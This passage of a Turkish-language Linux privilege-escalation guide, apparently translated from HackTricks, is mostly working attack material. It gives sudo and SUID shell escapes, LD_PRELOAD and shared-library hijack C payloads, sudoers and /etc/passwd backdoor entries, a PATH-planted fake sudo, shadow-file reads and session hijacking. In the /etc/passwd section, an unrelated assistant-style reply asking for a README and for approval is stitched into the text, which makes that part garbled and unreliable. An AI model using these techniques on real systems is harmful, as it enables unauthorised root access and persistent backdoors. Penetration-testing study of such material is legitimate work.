Erişim sağlamadan önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağınızı kontrol edin. Eğer yapabiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kontrol edin **kim olduğunuzu**, hangi **ayrıcalıklara** sahip olduğunuzu, sistemde hangi **kullanıcıların** bulunduğunu, hangilerinin **oturum açabildiğini** ve hangilerinin **root ayrıcalıklarına** sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları verebilecek herhangi bir grubun **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Eğer mümkünse panoda ilginç bir şey bulunup bulunmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın **herhangi bir parolasını biliyorsanız**, **parolayı kullanarak her kullanıcıya giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve bilgisayarda `su` ve `timeout` ikili dosyaları bulunuyorsa, kullanıcıya brute-force yapmak için [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanmayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile aynı zamanda kullanıcıları brute-force etmeye de çalışır.

## Yazılabilir PATH kötüye kullanımları

### $PATH

Eğer **$PATH içindeki herhangi bir klasöre yazabiliyorsanız**, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla **yazılabilir klasörün içine bir backdoor oluşturmak** suretiyle ayrıcalıkları yükseltebilirsiniz ve bunun için bu komutun sizin yazılabilir klasörünüzden **önce yer alan bir klasörden yüklenmemesi** gerekir.

### SUDO ve SUID

Bazı komutları sudo ile çalıştırma izniniz olabilir veya dosyalar suid biti ile işaretlenmiş olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza veya hatta bir komutu çalıştırmanıza izin verebilir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının şifreyi bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; artık root dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell elde etmek çok basit.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcıya bir şey çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesi yüklemek için **PYTHONPATH hijacking**'e karşı **savunmasızdı:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okuyun veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Bir **wildcard** kullanılmışsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmeden

Eğer bir komuta **sudo permission** verilmişse ve **komut yolu belirtilmemişse**: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary başka bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin).

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir fonksiyon oluşturup **export etmeyi** deneyebilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonrasında suid binary'yi çağırdığınızda bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, loader tarafından standart C kütüphanesi (`libc.so`) dahil diğer tüm kütüphanelerden önce yüklenecek bir veya daha fazla shared library (.so dosyası) belirtmek için kullanılır. Bu işleme bir kütüphaneyi önceden yükleme denir.

Ancak, sistem güvenliğini korumak ve bu özelliğin özellikle **suid/sgid** çalıştırılabilirlerle suistimal edilmesini önlemek için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) eşleşmeyen çalıştırılabilir dosyalar için **LD_PRELOAD**'u göz ardı eder.
- **suid/sgid** olan çalıştırılabilir dosyalar için, sadece standart yollar içinde bulunan ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Privilege escalation, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin `sudo` ile komutlar çalıştırıldığında bile kalıcı olmasına ve tanınmasına izin verir; bu da yükseltilmiş ayrıcalıklarla rastgele kod yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu dosyaya kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **compile it** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırın.
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Anormal görünen **SUID** izinlerine sahip bir ikiliyle karşılaşıldığında, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak potansiyel bir exploit imkânını gösterir.

Bunu exploit etmek için, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturarak aşağıdaki kodu içerecek şekilde devam edilir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldıktan sonra, file permissions'ı manipüle ederek ve elevated privileges ile bir shell çalıştırarak elevate privileges elde etmeyi amaçlar.

Yukarıdaki C file'ı shared object (.so) file olarak derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetikleyerek potansiyel sistem ele geçirilmesine yol açabilir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir folder'dan library yükleyen SUID binary'yi bulduğumuza göre, o folder'a gerekli isimle library oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının (binaries) saldırganlar tarafından yerel güvenlik kısıtlamalarını aşmak için sömürülebilecek özenle derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeyi, ancak bir komuta **sadece argüman enjekte edebildiğiniz** durumlar için yapar.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation tasks'i kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Sudo Token'lerini Yeniden Kullanma

Parolayı bilmediğiniz ancak **sudo access**'iniz olan durumlarda, bir sudo komutunun çalışmasını bekleyip oturum token'ını kaçırarak ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten bir shell'e `_sampleuser_` kullanıcısı olarak sahipsiniz
- `_sampleuser_` son 15 dakikada bir şeyi çalıştırmak için **`sudo` kullanmış olmalı** (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını düzenleyip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid olan** bir sh shell oluşturacaktır
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak**; bu dosya **sudo tokens'i kalıcı hale getirecek ve tüm kullanıcıların sudo kullanmasına izin verecek**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içinde oluşturulan herhangi bir dosyada **write permissions**'a sahipseniz, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile bir kullanıcı ve PID için **sudo token oluşturabilirsiniz**.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyorsanız ve PID 1234 ile o kullanıcı olarak bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan şu şekilde **sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimlerin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak sadece kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **edinebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** yapabileceksiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary'si için bazı alternatifler mevcuttur; örneğin OpenBSD için `doas`. Yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcı genellikle bir makineye bağlanıp yetki yükseltmek için `sudo` kullanıyorsa** ve o kullanıcı bağlamında bir shell elde ettiyseniz, root olarak önce kendi kodunuzu sonra kullanıcının komutunu çalıştıracak **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini değiştirin (örneğin yeni yolu .bash_profile içine ekleyerek) böylece kullanıcı sudo'yu çalıştırdığında sizin sudo yürütülebilir dosyanız çalışır.

Kullanıcının farklı bir shell (bash değil) kullanması durumunda yeni yolu eklemek için başka dosyaları değiştirmeniz gerekeceğini unutmayın. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Veya şu gibi bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf`, **yüklenen yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **kütüphanelerin aranacağı** başka klasörlere işaret eder. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'dir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer herhangi bir nedenle belirtilen yollardan herhangi biri üzerinde **bir kullanıcının yazma izinleri** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, yetki yükseltmesi elde edebilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** bir sonraki sayfada bakın:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, `RPATH` değişkeninde belirtildiği gibi program bu konumda onu kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde şu komutla kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux yetkileri bir sürece mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayırt edici birimlere** ayırır. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tam kümesi azaltılır ve sömürülme riskleri düşer.\
Aşağıdaki sayfayı okuyarak **yetkiler ve bunların nasıl kötüye kullanılacağı** hakkında daha fazla bilgi edinin:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının klasöre "**cd**" yapabilmesi anlamına gelir.\
**"read"** biti kullanıcının **dosyaları** listeleyebileceğini, ve **"write"** biti kullanıcının yeni **dosyalar** oluşturup silebileceğini ifade eder.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve **geleneksel ugo/rwx izinlerinin üzerine yazabilme** yeteneğine sahiptir. Bu izinler, sahip olmayan veya grubun parçası olmayan belirli kullanıcılara haklar vererek veya reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **ince ayrıntı daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresinde bulunabilir.

**Verin** kullanıcı "kali"ya bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Sistemden belirli ACL'lere sahip dosyaları al:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** sadece **kendi kullanıcınızın** screen sessions'ına **connect** edebileceksiniz. Ancak **oturum içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Session'e bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri**yle ilgili bir sorundu. Root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **Valentine box from HTB**'i inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) Eylül 2006 ile 13 Mayıs 2008 arasında oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, söz konusu OS'lerde yeni bir ssh key oluşturulurken meydana gelir; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Önemli yapılandırma değerleri

- **PasswordAuthentication:** Parola ile kimlik doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Parola doğrulamaya izin verildiğinde, sunucunun boş parola içeren hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

Root'un ssh ile oturum açıp açamayacağını belirtir; varsayılan `no`. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: Root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no`: izin yok

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public keys'i içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bu tokenlar home dizini ile değiştirilir. **Mutlak yollar belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home'undan göreli yollar**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, kullanıcı "**testusername**"ın **özel** anahtarıyla giriş yapmaya çalışırsanız ssh'nin anahtarınızın açık anahtarını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindeki anahtarlarla karşılaştıracağını gösterir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda anahtarları (parola koruması olmadan!) bırakmak yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece, ssh ile **bir host'a atlayabilir** ve oradan **ilk hostunuzda bulunan anahtarı kullanarak** **başka bir host'a** atlayabilirsiniz.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

The file `/etc/profile` and the files under `/etc/profile.d/` are **bir kullanıcı yeni bir shell çalıştırdığında yürütülen betiklerdir**. Therefore, if you can **bunlardan herhangi birine yazma veya değiştirme hakkınız varsa, ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi bir garip profil betiği bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir adla bulunabilir veya bir yedeği olabilir. Bu yüzden **hepsini bulmanız** ve dosyaları **okuyup okuyamadığınızı kontrol etmeniz**, dosyaların içinde **hash olup olmadığını** görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyası içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir password oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md içeriğini gönderir misiniz? Çeviriyi yapıp sonuna `hacker` kullanıcısını ekleyecek ve rastgele bir parola üretecek şekilde güncelleme yapabilmem için dosyanın orijinal metnine ihtiyacım var.

Ayrıca, parola oluşturulmasını onaylıyor musunuz? Onaylarsanız güçlü bir parola üreteceğim ve ekleyeceğim komut örnekleri şöyle olacaktır (onay aldıktan sonra gerçek içerikle birlikte ekleyeceğim):

- Kullanıcı ekleme: useradd -m -s /bin/bash hacker
- Parola atama (örnek parola burada yerine üretileni koyacağım): echo "hacker:ÜRETİLEN_PAROLA" | chpasswd

Devam etmemi onaylıyor musunuz?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabilir misiniz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned dosyalar
```bash
#root owned files in /home folders
